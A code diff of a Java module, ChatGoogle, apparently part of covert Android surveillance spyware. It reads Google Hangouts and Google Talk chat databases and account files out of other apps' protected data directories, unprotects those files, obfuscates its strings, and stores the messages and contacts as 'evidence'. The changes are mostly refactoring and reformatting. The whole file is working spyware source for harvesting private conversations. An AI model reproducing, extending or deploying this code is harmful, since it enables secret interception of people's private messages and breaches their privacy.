@@ -1,20 +1,5 @@
 package com.android.dvci.module.chat;
 
-import java.io.File;
-import java.io.IOException;
-import java.util.ArrayList;
-import java.util.Date;
-import java.util.List;
-import java.util.concurrent.Semaphore;
-
-import javax.xml.parsers.DocumentBuilder;
-import javax.xml.parsers.DocumentBuilderFactory;
-
-import org.w3c.dom.Document;
-import org.w3c.dom.NamedNodeMap;
-import org.w3c.dom.Node;
-import org.w3c.dom.NodeList;
-
 import android.database.Cursor;
 
 import com.android.dvci.auto.Cfg;
@@ -27,6 +12,21 @@ import com.android.dvci.util.Check;
 import com.android.dvci.util.StringUtils;
 import com.android.mm.M;
 
+import org.w3c.dom.Document;
+import org.w3c.dom.NamedNodeMap;
+import org.w3c.dom.Node;
+import org.w3c.dom.NodeList;
+
+import java.io.File;
+import java.io.IOException;
+import java.util.ArrayList;
+import java.util.Date;
+import java.util.List;
+import java.util.concurrent.Semaphore;
+
+import javax.xml.parsers.DocumentBuilder;
+import javax.xml.parsers.DocumentBuilderFactory;
+
 public class ChatGoogle extends SubModuleChat {
 
 	private static final String TAG = "ChatGoogle";
@@ -35,7 +35,7 @@ public class ChatGoogle extends SubModuleChat {
 
 	String pObserving = M.e("com.google.android.talk");
 
-	Semaphore readChatSemaphore = new Semaphore(1, true);
+	private Semaphore readBabelSemaphore = new Semaphore(1);
 
 	@Override
 	int getProgramId() {
@@ -57,7 +57,7 @@ public class ChatGoogle extends SubModuleChat {
 
 	/**
 	 * Estrae dal file RegisterPhone.xml il numero di telefono
-	 * 
+	 *
 	 * @return
 	 */
 	@Override
@@ -70,22 +70,30 @@ public class ChatGoogle extends SubModuleChat {
 
 	private void readChatMessages() {
 
-		long[] lastLines = markup.unserialize(new long[2]);
-
-		String babel0 = M.e("babel0.db");
-		String babel1 = M.e("babel1.db");
-		
-		String account = readAccount("1.name");
-		if(StringUtils.isEmpty(account) || !readHangoutMessages(lastLines, babel1, account)){
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (readChatMessages) try babel0");
-			}
-			account = readAccount("0.name");
-			readHangoutMessages(lastLines, babel0, account);
+		if (!readBabelSemaphore.tryAcquire()) {
+			return;
 		}
-		readGoogleTalkMessages(lastLines);
 
-		serializeMarkup(lastLines);
+		try {
+			long[] lastLines = markup.unserialize(new long[2]);
+
+			String babel0 = M.e("babel0.db");
+			String babel1 = M.e("babel1.db");
+
+			String account = readAccount("1.name");
+			if (StringUtils.isEmpty(account) || !readHangoutMessages(lastLines, babel1, account)) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (readChatMessages) try babel0");
+				}
+				account = readAccount("0.name");
+				readHangoutMessages(lastLines, babel0, account);
+			}
+			readGoogleTalkMessages(lastLines);
+
+			serializeMarkup(lastLines);
+		} finally {
+			readBabelSemaphore.release();
+		}
 	}
 
 	private void serializeMarkup(long[] lastLines) {
@@ -102,19 +110,20 @@ public class ChatGoogle extends SubModuleChat {
 	}
 
 	private boolean readHangoutMessages(long[] lastLines, String dbFile, String account) {
-		
+
 		String dbDir = M.e("/data/data/com.google.android.talk/databases");
 
-		
+
 		//if (ManagerModule.self().isInstancedAgent(ModuleAddressBook.class)) {
 		//	saveContacts(helper);
 		//}
-	
+
 		String sql_c = M.e("select cp.conversation_id, latest_message_timestamp, full_name, latest_message_timestamp from conversations as c ") +
 				M.e("join conversation_participants as cp on c.conversation_id=cp.conversation_id join participants as p on  cp.participant_row_id=p._id");
-		
+
+		// babel
 		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile);
-		if(helper == null){
+		if (helper == null) {
 			return false;
 		}
 
@@ -142,7 +151,7 @@ public class ChatGoogle extends SubModuleChat {
 			if (newHangoutReadDate > 0) {
 				lastLines[1] = newHangoutReadDate;
 			}
-		}finally {
+		} finally {
 			helper.disposeDb();
 		}
 		return true;
@@ -150,11 +159,11 @@ public class ChatGoogle extends SubModuleChat {
 
 	private long fetchHangoutMessages(GenericSqliteHelper helper, final HangoutConversation conversation, final ChatGroups groups, long lastTimestamp) {
 		final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();
-		
+
 		String sql_m = String.format(M.e("select m._id, full_name, fallback_name ,text, timestamp, type, p.chat_id ") +
-				M.e("from messages as m join participants as p on m.author_chat_id = p.chat_id where type<3 and conversation_id='%s' and timestamp>%s"), 
+						M.e("from messages as m join participants as p on m.author_chat_id = p.chat_id where type<3 and conversation_id='%s' and timestamp>%s"),
 				conversation.id, lastTimestamp);
-		
+
 		RecordVisitor visitor = new RecordVisitor() {
 
 			@Override
@@ -165,16 +174,16 @@ public class ChatGoogle extends SubModuleChat {
 				String fallback_name = cursor.getString(2);
 				String body = cursor.getString(3);
 				long timestamp = cursor.getLong(4);
-		
+
 				boolean incoming = cursor.getInt(5) == 2;
 				String chat_id = cursor.getString(6);
-						
+
 				String peer = fullName;
 				//if (fallback_name!=null)
 				//	peer = fallback_name;
 
 				// localtime or gmt? should be converted to gmt
-				Date date = new Date(timestamp/1000);
+				Date date = new Date(timestamp / 1000);
 
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (cursor) peer: " + peer + " timestamp: " + timestamp + " incoming: "
@@ -194,7 +203,7 @@ public class ChatGoogle extends SubModuleChat {
 				fromDisplay = incoming ? peer : conversation.account;
 
 				Contact contact = groups.getContact(peer);
-		
+
 				if (isGroup) {
 					// if (peer.equals("0")) {
 					// peer = conversation.account;
@@ -220,16 +229,16 @@ public class ChatGoogle extends SubModuleChat {
 				return timestamp;
 			}
 		};
-		
+
 		long newLastId = helper.traverseRawQuery(sql_m, new String[]{}, visitor);
 
 		if (messages != null && messages.size() > 0) {
 			saveEvidence(messages);
 		}
-		
+
 		return newLastId;
 	}
-	
+
 	public void saveEvidence(ArrayList<MessageChat> messages) {
 		getModule().saveEvidence(messages);
 	}
@@ -250,9 +259,9 @@ public class ChatGoogle extends SubModuleChat {
 				Contact contact;
 
 				String email = fullname;
-				if(email==null)
+				if (email == null)
 					return 0;
-				
+
 				contact = new Contact(id, email, fullname, "");
 
 				if (Cfg.DEBUG) {
@@ -267,13 +276,13 @@ public class ChatGoogle extends SubModuleChat {
 		};
 
 		String sqlquery = M.e("select  p.chat_id, full_name, fallback_name, cp.conversation_id from conversation_participants as cp join participants as p on  cp.participant_row_id=p._id where conversation_id=?");
-		helper.traverseRawQuery(sqlquery, new String[] { thread_id }, visitor);
+		helper.traverseRawQuery(sqlquery, new String[]{thread_id}, visitor);
 	}
 
 	private List<HangoutConversation> getHangoutConversations(GenericSqliteHelper helper, final String account, long timestamp) {
 		final List<HangoutConversation> conversations = new ArrayList<HangoutConversation>();
-		
-		String[] projection = new String[] { M.e("conversation_id"), M.e("latest_message_timestamp"), M.e("conversation_type"), M.e("generated_name") };
+
+		String[] projection = new String[]{M.e("conversation_id"), M.e("latest_message_timestamp"), M.e("conversation_type"), M.e("generated_name")};
 		String selection = "latest_message_timestamp > " + timestamp;
 
 		RecordVisitor visitor = new RecordVisitor(projection, selection) {
@@ -297,13 +306,13 @@ public class ChatGoogle extends SubModuleChat {
 		helper.traverseRecords(M.e("conversations"), visitor);
 
 		return conversations;
-		
+
 	}
 
 	private String readAccount(String nameField) {
 		String xmlDir = M.e("/data/data/com.google.android.talk/shared_prefs");
 		String xmlFile = M.e("accounts.xml");
-		
+
 		Path.unprotect(xmlDir, xmlFile, true);
 
 		DocumentBuilder builder;
@@ -317,7 +326,7 @@ public class ChatGoogle extends SubModuleChat {
 				NamedNodeMap attributes = d.getAttributes();
 				Node attr = attributes.getNamedItem("name");
 				// nameField = "0.name"
-				if(nameField.equals(attr.getNodeValue())){
+				if (nameField.equals(attr.getNodeValue())) {
 					Node child = d.getFirstChild();
 					account = child.getNodeValue();
 					break;
@@ -329,12 +338,12 @@ public class ChatGoogle extends SubModuleChat {
 				Check.log(TAG + " (readAccount) Error: " + e);
 			}
 		}
-		if(account!=null){
+		if (account != null) {
 			ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.GOOGLE, account);
 		}
-		
+
 		return account;
-		
+
 	}
 
 	private void readGoogleTalkMessages(long[] lastLines) {
@@ -342,17 +351,7 @@ public class ChatGoogle extends SubModuleChat {
 			Check.log(TAG + " (readChatMessages)");
 		}
 
-		if (!readChatSemaphore.tryAcquire()) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (readChatMessages), semaphore red");
-			}
-
-			return;
-		}
-
 		try {
-			boolean updateMarkup = false;
-
 			String dbFile = M.e("talk.db");
 			String dbDir = M.e("/data/data/com.google.android.gsf/databases");
 
@@ -365,7 +364,7 @@ public class ChatGoogle extends SubModuleChat {
 				return;
 			}
 
-			try{
+			try {
 				setMyAccount(helper);
 
 				// Save contacts if AddressBook is active
@@ -383,9 +382,6 @@ public class ChatGoogle extends SubModuleChat {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (readChatWeChatMessages) Error: ", ex);
 			}
-		} finally {
-
-			readChatSemaphore.release();
 		}
 	}
 
@@ -439,7 +435,7 @@ public class ChatGoogle extends SubModuleChat {
 				return createTime;
 			}
 		};
-		long lastCreationLine = helper.traverseRawQuery(sqlquery, new String[] { Long.toString(lastLine) }, visitor);
+		long lastCreationLine = helper.traverseRawQuery(sqlquery, new String[]{Long.toString(lastLine)}, visitor);
 
 		getModule().saveEvidence(messages);
 
@@ -447,7 +443,7 @@ public class ChatGoogle extends SubModuleChat {
 	}
 
 	private void setMyAccount(GenericSqliteHelper helper) {
-		String[] projection = new String[] { "_id", "name", "username" };
+		String[] projection = new String[]{"_id", "name", "username"};
 		RecordVisitor visitor = new RecordVisitor() {
 
 			@Override
@@ -471,7 +467,7 @@ public class ChatGoogle extends SubModuleChat {
 	}
 
 	private void saveContacts(GenericSqliteHelper helper) {
-		String[] projection = new String[] { "username", "nickname" };
+		String[] projection = new String[]{"username", "nickname"};
 
 		boolean tosave = false;
 		RecordVisitor visitor = new RecordVisitor(projection, "nickname not null ") {
